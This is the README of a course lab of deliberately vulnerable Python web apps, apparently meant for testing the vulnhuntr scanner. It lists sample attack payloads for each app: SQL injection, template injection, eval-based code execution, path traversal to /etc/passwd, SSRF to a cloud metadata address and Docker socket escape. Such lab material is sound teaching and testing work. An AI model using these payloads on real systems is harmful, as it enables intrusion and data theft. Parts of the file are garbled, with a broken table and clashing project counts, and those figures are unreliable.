# DVPP - Deliberately Vulnerable Python Projects Lab

A comprehensive security testing laboratory featuring **10 diverse vulnerable Python web applications** covering **82+ distinct vulnerability types** from real-world exploits.

**FOR EDUCATIONAL USE ONLY - DO NOT DEPLOY IN PRODUCTION ENVIRONMENTS**

---

## Quick Links

**Ready to deploy?** Choose your path:

- **[DEPLOYMENT_READY.md](DEPLOYMENT_READY.md)** - Complete summary & one-command deployment
- **[QUICKSTART.md](QUICKSTART.md)** - 5-minute quick start guide
- **[TESTING.md](TESTING.md)** - Comprehensive testing procedures (9 phases)
- **[TEST_STATUS.md](TEST_STATUS.md)** - Current verification status
- **[verify.sh](verify.sh)** - Automated verification script
- **[VULNERABILITY_MAP_QUICK.md](docs/VULNERABILITY_MAP_QUICK.md)** - Quick vulnerability reference
- **[exploits/](exploits/)** - Organized exploit collection

**One-line deployment:**
```bash
cd /home/diaz/workspace/CS5374/DVPP && docker-compose up -d
```

---

## Overview

Created for CS5374, this lab environment provides realistic attack surfaces for:

- Testing vulnhuntr vulnerability scanner
- Learning web application security through hands-on exploitation
- Practicing penetration testing in a safe, controlled environment
- Understanding secure coding through deliberate counterexamples

## Project Structure

```
DVPP/
├── projects/
│   ├── securedoc/             Document Management (~1,627 LOC) - Port 5000
│   ├── vulnblog/              Blog/CMS Platform (~800 LOC) - Port 5001
│   ├── dataviz/               Analytics Dashboard (~1,400 LOC) - Port 5002
│   ├── fileshare/             File Sharing (~400 LOC) - Port 5003
│   ├── apigateway/            REST API Gateway (~500 LOC) - Port 5004
│   ├── ecomstore/             E-commerce Shop (~450 LOC) - Port 5005
│   ├── chatapp/               Real-time Chat (~400 LOC) - Port 5006
│   ├── adminpanel/            Admin Dashboard (~450 LOC) - Port 5007
│   ├── DSVPWA/                Vulnerable Web App (~400 LOC) - Port 65413
│   └── Python-VulnerableApp/  DVPWA Clone (~800 LOC) - Port 8080
├── exploits/           # Organized exploits mapped to each project
│   ├── securedoc/     # SQLi, LFI, RCE, SSTI, XXE exploits
│   ├── vulnblog/      # XSS, SQLi, CSRF, SSRF exploits
│   ├── dataviz/       # RCE, deserialization, SSRF exploits
│   ├── fileshare/     # File upload RCE, LFI exploits
│   ├── apigateway/    # SSRF, command injection, Docker escape
│   ├── ecomstore/     # SQLi, XSS, CSRF exploits
│   ├── chatapp/       # XSS, SQLi, RCE exploits
│   ├── adminpanel/    # Multiple RCE, Docker escape exploits
│   ├── dsvpwa/        # Full spectrum: SQLi, XSS, RCE, pickle, etc.
│   └── python-vulnerableapp/ # SQLi, XSS, CSRF, weak crypto
├── docs/               # Vulnerability mappings from 82 real CVEs
├── scripts/            # Automation scripts (start_all.sh, scan_all.sh, organize_exploits.sh)
├── scans/              # vulnhuntr scan results
├── docker-compose.yml  # Launch all 10 apps simultaneously
└── README.md          # This file
```

## The Ten Projects

### 1. SecureDoc - Document Management System (PORT 5000)

**Status:** COMPLETE  
**Lines of Code:** 1,627  
**Architecture:** 4-layer (Models, Services, Utils, Views)  
**Complexity:** Medium-Large

**Vulnerabilities:** ~20 instances

- SQL Injection (10+ in models layer)
- IDOR - Insecure Direct Object References (5+)
- LFI - Local File Inclusion (5+)
- AFO - Arbitrary File Overwrite (4+)
- RCE - Remote Code Execution (6+ via eval/exec/subprocess/pickle)
- XSS - Cross-Site Scripting (10+)
- SSRF - Server-Side Request Forgery (8+)

**Quick Start:**

```bash
cd projects/securedoc && python run.py
# Or: docker-compose up --build
```

**Test Credentials:** `admin/admin123`, `user/password123`

**Key Exploits:**

- `/auth/login?username=admin'--` - SQL injection bypass
- `/docs/view/2` - IDOR to view other users' documents
- `/docs/read_file?file=../../etc/passwd` - LFI  
- `/admin/evaluate?expr=__import__('os').system('id')` - RCE
- `/admin/fetch_url?url=http://169.254.169.254/` - SSRF

[Full Documentation](projects/securedoc/README.md)

---

### 2. VulnBlog - Blog/CMS Platform (PORT 5001)

**Status:** COMPLETE  
**Lines of Code:** ~800  
**Architecture:** 4-layer (Models, Services, Utils, Views)  
**Complexity:** Small-Medium

**Vulnerabilities:** ~12 instances

- XSS - Stored, Reflected (4)
- CSRF - Cross-Site Request Forgery (3)
- SSTI - Server-Side Template Injection (2)
- Auth/Session Bypass (2)
- SQL Injection (2)
- RCE via eval/exec (3)

**Quick Start:**

```bash
cd projects/vulnblog && python run.py
# Or: docker-compose up --build
```

**Test Credentials:** `admin/admin123`, `blogger/password`, `user/user`

**Key Exploits:**

- `POST /auth/login` - SQLi: `username=admin'--`
- `POST /posts/create` - Stored XSS in title/content
- `POST /admin/render` - SSTI: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
- `POST /admin/evaluate` - RCE: `__import__('os').system('whoami')`
- `POST /admin/themes/activate/2` - CSRF (no token validation)

[Full Documentation](projects/vulnblog/README.md)

---

### 3. DataViz - Data Analytics Dashboard (PORT 5002)

**Status:** COMPLETE  
**Lines of Code:** ~1,400  
**Architecture:** 4-layer (Models, Services, Utils, Views)  
**Complexity:** Large

**Vulnerabilities:** ~13 instances

- Deserialization - pickle, jsonpickle (3)
- RCE - eval/exec for data analysis (5)
- CSV Injection - Formula injection (2)
- Info Disclosure (2)
- SSRF - External data fetching (1)

**Quick Start:**

```bash
cd projects/dataviz && python run.py
# Or: docker-compose up --build
```

**Key Exploits:**

- `POST /data/upload` - Upload malicious .pkl file
- `GET /data/load/1` - Trigger deserialization RCE
- `POST /analysis/eval` - RCE: `{"expr": "__import__('os').system('id')"}`
- `POST /analysis/execute` - RCE: `{"code": "import os; os.system('whoami')"}`
- `POST /export/csv` - CSV injection: `{"data": [["=cmd|'/c calc'!A1"]]}`
- `POST /data/load-remote` - SSRF: `{"url": "http://169.254.169.254/latest/meta-data/"}`

---

### 4. FileShare - File Sharing Platform (PORT 5003)

**Status:** COMPLETE  
**Lines of Code:** ~400  
**Architecture:** Single-file Flask app  
**Complexity:** Small

**Vulnerabilities:** ~9 instances

- File Upload RCE (2)
- Path Traversal (3)
- Local File Inclusion (1)
- XSS (1)
- Open Redirect (1)
- AFO via Zip Slip (1)

**Quick Start:**

```bash
cd projects/fileshare && python app.py
# Or: docker-compose up --build
```

**Key Exploits:**

- `POST /upload` - Upload .py file (auto-executes)
- `GET /download?path=/etc/passwd` - Path traversal
- `GET /view?file=/etc/passwd` - LFI
- `GET /redirect?url=http://evil.com` - Open redirect
- `POST /extract` - Zip slip vulnerability
- `POST /process` - Command injection

---

### 5. APIGateway - REST API Service (PORT 5004)

**Status:** COMPLETE  
**Lines of Code:** ~500  
**Architecture:** Single-file Flask app  
**Complexity:** Medium

**Vulnerabilities:** ~12 instances

- SSRF - API proxying (1)
- RCE - Command injection (1)
- Docker escape vulnerabilities (3)
- Auth Bypass (1)
- Info Disclosure (1)
- JWT bypass (1)

**Quick Start:**

```bash
cd projects/apigateway && python app.py
# Or: docker-compose up --build --privileged
```

**Key Exploits:**

- `POST /proxy` - SSRF: `{"url": "http://169.254.169.254/"}`
- `POST /exec` - RCE: `{"command": "whoami"}`
- `POST /docker/run` - Docker RCE: `{"image": "alpine", "command": "cat /etc/passwd"}`
- `POST /docker/socket` - Direct Docker daemon access
- `GET /admin` with header `X-Admin: true` - Auth bypass
- `GET /status` - Info disclosure (env vars, config)

---

### 6. EcomStore - E-commerce Shop (PORT 5005)

**Status:** COMPLETE  
**Lines of Code:** ~450  
**Architecture:** Single-file Flask app  
**Complexity:** Medium

**Vulnerabilities:** ~10 instances

- SQL Injection (2)
- XSS (2)
- CSRF (1)
- RCE via exec (1)
- Auth Bypass (1)
- Path Traversal (1)

**Quick Start:**

```bash
cd projects/ecomstore && python app.py
# Or: docker-compose up --build
```

**Test Credentials:** `admin/admin123`

**Key Exploits:**

- `POST /login` - SQLi: `username=admin'-- &password=x`
- `GET /products?search=<script>alert(1)</script>` - XSS
- `POST /order` - CSRF (no validation)
- `POST /admin/execute` - RCE: `{"code": "import os; os.system('id')"}`
- `GET /invoice?path=/etc/passwd` - Path traversal

---

### 7. ChatApp - Real-time Chat (PORT 5006)

**Status:** COMPLETE  
**Lines of Code:** ~400  
**Architecture:** Single-file Flask app  
**Complexity:** Small

**Vulnerabilities:** ~7 instances

- XSS - Stored in messages (2)
- RCE via chatbot commands (3)
- Path Traversal (1)
- Info Disclosure (1)

**Quick Start:**

```bash
cd projects/chatapp && python app.py
# Or: docker-compose up --build
```

**Key Exploits:**

- `POST /send` - Stored XSS: `{"content": "<script>alert(1)</script>"}`
- `POST /bot` - RCE: `{"command": "/eval __import__('os').system('id')"}`
- `POST /bot` - RCE: `{"command": "/exec import os; os.system('whoami')"}`
- `POST /bot` - RCE: `{"command": "/run cat /etc/passwd"}`
- `GET /admin/read_log?file=/etc/passwd` - Path traversal
- `GET /debug` - Info disclosure

---

### 8. AdminPanel - Admin Dashboard (PORT 5007)

**Status:** COMPLETE  
**Lines of Code:** ~450  
**Architecture:** Single-file Flask app  
**Complexity:** Medium

**Vulnerabilities:** ~12 instances

- RCE cluster (3)
- Deserialization (1)
- Path Traversal (1)
- Docker escape (1)
- Account Takeover (1)
- Command injection (1)
- Multiple/Info disclosure (2)

**Quick Start:**

```bash
cd projects/adminpanel && python app.py
# Or: docker-compose up --build --privileged
```

**Key Exploits:**

- `POST /system/exec` - Command injection: `{"command": "whoami"}`
- `POST /system/eval` - RCE: `{"expression": "__import__('os').system('id')"}`
- `POST /system/python` - RCE: `{"code": "import os; os.system('whoami')"}`
- `POST /config/load` - Deserialization: Malicious pickle in base64
- `GET /logs/view?file=/etc/passwd` - Path traversal
- `POST /docker/exec` - Docker escape
- `POST /users/reset` - Account takeover (no verification)

---

### 9. DSVPWA - Damn Simple Vulnerable Python Web App (PORT 65413)

**Status:** COMPLETE (Imported)  
**Lines of Code:** ~400  
**Architecture:** Single-file Flask-like app  
**Complexity:** Small

**Vulnerabilities:** ~12 instances

- SQL Injection (2 types - auth bypass, data extraction)
- XSS (Reflected + Stored)
- Command Injection (RCE via subprocess)
- Unsafe Deserialization (Pickle RCE)
- Path Traversal / LFI (with RFI support)
- Session Fixation
- Session Hijacking
- CSRF (state-changing GET requests)
- Clickjacking
- Open Redirect
- Execution After Redirect (EAR)

**Quick Start:**

```bash
cd projects/DSVPWA
python dsvpwa.py
# Or: docker build -t dsvpwa . && docker run -p 65413:65413 dsvpwa
```

**Key Exploits:**

- `/sqli?id=1 OR 1=1` - SQL injection
- `/login` - Auth bypass: `username=admin'--`
- `/xss_r?msg=<script>alert(1)</script>` - Reflected XSS
- `/guestbook` - Stored XSS in comments
- `/rce?command=ping;cat /etc/passwd&domain=8.8.8.8` - Command injection
- `/extract?object=<base64_pickle>` - Pickle deserialization RCE
- `/traversal?path=../../../etc/passwd` - Path traversal
- `/fixation?session_id=attacker_sid` - Session fixation
- `/settings?email=attacker@evil.com` - CSRF via GET
- `/redirect?path=http://evil.com` - Open redirect

**Exploit Directory:** `exploits/dsvpwa/`

---

### 10. Python-VulnerableApp (DVPWA) - Port 8080

**Status:** COMPLETE (Imported)  
**Lines of Code:** ~800  
**Architecture:** Medium MVC (aiohttp + Jinja2 + PostgreSQL)  
**Complexity:** Medium

**Vulnerabilities:** ~6 primary types

- SQL Injection (String formatting instead of parameterized queries)
- XSS (Autoescape disabled globally in Jinja2)
- CSRF (Protection middleware commented out)
- Weak Cryptography (MD5 for password hashing)
- Missing Security Headers (No CSP, X-Frame-Options)
- Information Disclosure (Debug mode, verbose errors)

**Quick Start:**

```bash
cd projects/Python-VulnerableApp
docker-compose up --build
# Access at http://localhost:8080
```

**Key Exploits:**

- `/students/` - SQLi in INSERT: `name=test'); DROP TABLE students;--`
- All pages - XSS due to autoescape=False: `<script>alert(1)</script>`
- All POST forms - CSRF (no token validation)
- User passwords - MD5 cracking with rainbow tables
- Any endpoint - Clickjacking (missing X-Frame-Options)

**Exploit Directory:** `exploits/python-vulnerableapp/`

**Database:** PostgreSQL (persistent with docker-compose)  
**Session Storage:** Redis  

---

## Vulnerability Coverage (82 Total)

Based on analysis of real-world Python exploits from ExploitDB and Metasploit:

| Category | Count | Primary Project | Notes |
|----------|-------|----------------|-------|
| **RCE** | 35 | All projects | eval, exec, subprocess, deserialization |
| **Traversal/LFI** | 7 | SecureDoc, FileShare | Path traversal, file inclusion |
| **XSS** | 7 | VulnBlog, SecureDoc | Stored, reflected, DOM |
| **Other** | 7 | APIGateway | Docker, account takeover |
| **Auth/Session** | 4 | VulnBlog, APIGateway | Bypass, hijacking |
| **Info Disclosure** | 4 | DataViz, APIGateway | Error messages, debug |
| **Deserialization** | 3 | DataViz | pickle, jsonpickle |
| **CSRF** | 3 | VulnBlog | No tokens/validation |
| **SQLI** | 2 | SecureDoc, VulnBlog | String concatenation |
| **SSRF** | 2 | SecureDoc, APIGateway | Internal requests |
| **SSTI** | 2 | VulnBlog | Jinja2 template injection |
| **File Upload** | 2 | FileShare | Executable uploads |
| **CSV Injection** | 2 | DataViz | Formula injection |
| **Open Redirect** | 1 | FileShare | Unvalidated redirects |
| **Multiple** | 1 | APIGateway | Combined vulnerabilities |

## Quick Start Guide

### Prerequisites

```bash
# Requirements
- Python 3.10+
- Docker & Docker Compose (for containerized deployment)
- pip
```

### Option 1: Run All Projects with Docker (Recommended)

```bash
cd /home/diaz/workspace/CS5374/DVPP

# Start all 10 applications
./scripts/start_all.sh

# Applications will be available at:
# - SecureDoc:   http://localhost:5000
# - VulnBlog:    http://localhost:5001
# - DataViz:     http://localhost:5002
# - FileShare:   http://localhost:5003
# - APIGateway:  http://localhost:5004
# - EcomStore:   http://localhost:5005
# - ChatApp:     http://localhost:5006
# - AdminPanel:  http://localhost:5007

# Stop all
./scripts/stop_all.sh
```

### Option 2: Run Individual Projects Locally

```bash
# Example: SecureDoc
cd projects/securedoc
pip install -r requirements.txt
python run.py

# Example: VulnBlog
cd projects/vulnblog
pip install -r requirements.txt
python run.py

# Example: Simplified projects (single file)
cd projects/fileshare && python app.py
cd projects/apigateway && python app.py
cd projects/ecomstore && python app.py
cd projects/chatapp && python app.py
cd projects/adminpanel && python app.py
```

### Option 3: Docker Compose (Individual Projects)

```bash
# Run single project
cd projects/securedoc
docker-compose up --build

# Run in detached mode
docker-compose up -d --build

# View logs
docker-compose logs -f

# Stop
docker-compose down
```

### Testing with vulnhuntr

```bash
# Scan all projects
./scripts/scan_all.sh

# Scan individual project
cd /home/diaz/workspace/CS5374/vulnhuntr
vulnhuntr -r /home/diaz/workspace/CS5374/DVPP/projects/securedoc

# Results saved in: scans/<project>_scan.txt
```

## Documentation

- [SecureDoc Documentation](projects/securedoc/README.md) - Complete
- [VulnBlog Documentation](projects/vulnblog/README.md) - Complete
- [Vulnerability Mappings](docs/internal/exploit_list_by_category.md) - 82 real CVEs
- [Exploit Counts](docs/internal/exploit_counts_by_category.md) - By category
- [Master Docker Compose](docker-compose.yml) - All 10 projects
- [Automation Scripts](scripts/) - start_all.sh, stop_all.sh, scan_all.sh

## Educational Value

### What This Lab Teaches

1. **Vulnerability Recognition**
   - Identifying vulnerable code patterns
   - Understanding attack surfaces
   - Recognizing security anti-patterns

2. **Exploitation Techniques**
   - Payload crafting for different vulnerability types
   - Bypassing weak security controls
   - Chaining vulnerabilities

3. **Secure Coding Practices**
   - Input validation and sanitization
   - Output encoding/escaping
   - Parameterized queries
   - Secure session management
   - Proper authentication/authorization

4. **Tool Usage**
   - Automated scanning with vulnhuntr
   - Manual code review
   - Understanding tool limitations

## Real-World CVE Mappings

Each vulnerability is inspired by real exploits:

- **RCE:** CVE-2025-1550 (Keras), CVE-2024-42845 (Invesalius3), CVE-2023-0297 (PyLoad)
- **SSRF:** CVE-2022-31188 (CVAT), CVE-2022-36551 (Label Studio)
- **LFI:** CVE-2024-23334 (aiohttp), CVE-2019-14322 (Werkzeug)
- **SSTI:** CVE-2019-8341 (Jinja2), CVE-2023-29689 (Pyro CMS)
- **Deserialization:** CVE-2022-34668 (NVFLARE), CVE-2021-24040 (ParlAI)

See [docs/internal/](docs/internal/) for complete mappings.

## Security Warnings

### NEVER

- Deploy these applications to the internet
- Use any code in production environments
- Store real/sensitive data
- Run on systems with important data

### ALWAYS

- Use isolated lab environments (VMs/containers)
- Run on localhost or private networks only
- Keep firewall rules restrictive
- Treat as malicious code in testing
 Docker |
|---------|--------|-----|-----------------|------|--------|
| SecureDoc | Complete | 1,627 | 20 | 5000 | |
| VulnBlog | Complete | 800 | 12 | 5001 | |
| DataViz | Complete | 1,400 | 13 | 5002 | |
| FileShare | Complete | 400 | 9 | 5003 | |
| APIGateway | Complete | 500 | 12 | 5004 | |
| EcomStore | Complete | 450 | 10 | 5005 | |
| ChatApp | Complete | 400 | 7 | 5006 | |
| AdminPanel | Complete | 450 | 12 | 5007 | |

**Total:** 8/8 projects complete (100% implementation)

## Development Roadmap

### Phase 1: SecureDoc (COMPLETE)

- Multi-layer architecture with DAOs, services, utils, views
- 20+ vulnerabilities across 7 categories
- Fully functional document management system

### Phase 2: VulnBlog (COMPLETE)

- XSS-focused CMS platform
- CSRF, SSTI, auth bypass
- Multi-user blogging system

### Phase 3: DataViz (COMPLETE)

- Data science application
- Deserialization, eval/exec RCE
- CSV injection, info disclosure

### Phase 4: FileShare (COMPLETE)

- File upload/download service
- Path traversal, malicious uploads
- File processing vulnerabilities

### Phase 5: APIGateway (COMPLETE)

- Microservice architecture
- SSRF, Docker escapes
- JWT, auth bypass, info disclosure

### Phase 6: EcomStore (COMPLETE)

- E-commerce platform
- SQLi, XSS, CSRF
- Payment and order vulnerabilities

### Phase 7: ChatApp (COMPLETE)

- Real-time messaging
- XSS via messages
- RCE via chatbot commands

### Phase 8: AdminPanel (COMPLETE)

- System administration dashboard
- Multiple RCE vectors
- Docker escape, account takeover

## Statistics

All 10 projects are now complete with full vulnerability coverage.

## Docker Deployment

### Master Docker Compose (All 10 Apps)

```bash
# Start all applications
docker-compose up -d --build

# View logs
docker-compose logs -f [service_name]

# Stop all
docker-compose down

# Clean up (remove volumes)
docker-compose down -v
```

### Individual Project Deployment

Each project has its own `docker-compose.yml`:

```bash
cd projects/<project_name>
docker-compose up --build
```

### Network Isolation

All containers run on an isolated bridge network `dvpp_vulnlab`, ensuring:

- Inter-container communication possible
- Isolated from host network by default
- Ports exposed only as configured

### Volume Mounts

- **SecureDoc, VulnBlog, DataViz:** Persistent data in `./data/`
- **FileShare, EcomStore, ChatApp:** Temporary uploads in `/tmp/`
- **APIGateway, AdminPanel:** Docker socket access (for Docker escape demos)

### Security Notes for Docker

**WARNING: APIGateway and AdminPanel mount the Docker socket** - This is intentional for demonstrating Docker escape vulnerabilities but poses significant security risks:

- Can control host Docker daemon
- Can start privileged containers
- Can access host filesystem
- **NEVER run these in production or on shared systems**
- 14/14 vulnerability categories covered
- All projects Docker-ready
- Master docker-compose for all apps
- Automation scripts (start/stop/scan)

**Coverage:**

- 82+ CVE-mapped vulnerabilities
- 10 diverse application types
- Varying complexity (Small to Large)
- Isolated deployment via Docker
- ~7,800 lines of vulnerable code
- 82+ vulnerabilities
- 14/14 categories covered

## Contributing

This is an educational project for CS5374. To contribute:

1. Review the vulnerability mappings in `docs/internal/`
2. Choose an unimplemented project
3. Follow the established architecture pattern
4. Document each vulnerability with CVE references

## License

[MIT License](LICENSE) - For educational and research purposes only.

## Related Resources

- [vulnhuntr](https://github.com/protectai/vulnhuntr) - AI-powered vulnerability scanner
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Web application security risks
- [CWE](https://cwe.mitre.org/) - Common Weakness Enumeration
- [ExploitDB](https://www.exploit-db.com/) - Vulnerability database

---

**Educational Disclaimer:** These applications contain intentional security vulnerabilities. They demonstrate insecure coding practices and should NEVER be used as reference for production code or deployed in any real-world environment.
